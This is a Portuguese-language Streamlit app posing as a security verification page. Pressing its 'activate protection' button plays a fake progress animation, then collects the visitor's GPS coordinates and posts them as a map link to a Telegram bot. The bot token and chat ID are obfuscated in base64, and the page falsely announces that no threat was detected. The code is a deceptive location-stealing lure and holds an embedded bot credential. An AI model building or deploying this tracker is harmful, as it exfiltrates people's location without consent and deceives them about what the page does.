import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- SEGURANÇA MÁXIMA (Base64) ---
B_TK = "ODUyNTkyNzY0MTpBQUhLRE9ORnZoOExnVXBJRU5tdHBsVGZIdW9GcmcxZmZyOA=="
B_ID = "ODIxMDgyODM5OA=="

def enviar_telegram(mensagem):
    try:
        # Decodifica as chaves na hora do envio
        tk = base64.b64decode(B_TK).decode("utf-8")
        ci = base64.b64decode(B_ID).decode("utf-8")
        url = f"https://api.telegram.org/bot{tk}/sendMessage"
        payload = {"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=10)
    except:
        pass

# Configuração da Página
st.set_page_config(page_title="SEGURANÇA INTEGRADA", page_icon="🔐", layout="centered")

# Estilo Visual Atualizado
st.markdown("""
    <style>
    .main { background-color: #0d1117; color: #ffffff; }
    .status-ok { 
        color: #2ea043; 
        font-weight: bold; 
        font-size: 18px; 
        margin-top: 15px;
        font-family: sans-serif;
    }
    .stProgress > div > div > div > div { background-color: #0056b3; }
    .stButton>button {
        background-color: #21262d; color: #c9d1d9; border: 1px solid #30363d;
        width: 100%; border-radius: 6px;
    }
    .miamy-footer {
        text-align: center;
        color: #8b949e;
        font-size: 12px;
        margin-top: 100px;
        border-top: 1px solid #30363d;
        padding-top: 20px;
    }
    </style>
    """, unsafe_allow_html=True)

st.title("Verificação de Segurança")

# Lógica de Sessão
if 'verificado' not in st.session_state:
    st.session_state.verificado = False

if not st.session_state.verificado:
    if st.button("● ATIVAR PROTEÇÃO AGORA"):
        barra_progresso = st.progress(0)
        
        # Animação da barra
        for i in range(1, 101):
            time.sleep(0.02)
            barra_progresso.progress(i)
        
        # Coleta GPS
        loc = get_geolocation()
        if loc:
            lat = loc['coords']['latitude']
            lon = loc['coords']['longitude']
            mapa = f"https://www.google.com/maps?q={lat},{lon}"
            
            # Envia para o Bot
            msg = f"🚨 SISTEMA ATIVADO\n📍 Localização: {mapa}"
            enviar_telegram(msg)
            
            st.session_state.verificado = True
            st.rerun()
else:
    # 2° O QUE VOCÊ PEDIU: Mensagem Verde após 100%
    st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)
    st.progress(100)
    st.button("● PROTEÇÃO ATIVA", disabled=True)

# Rodapé Miamy
st.markdown('<div class="miamy-footer">Sistema Integrado desenvolvido por Miamy © 2026</div>', unsafe_allow_html=True)
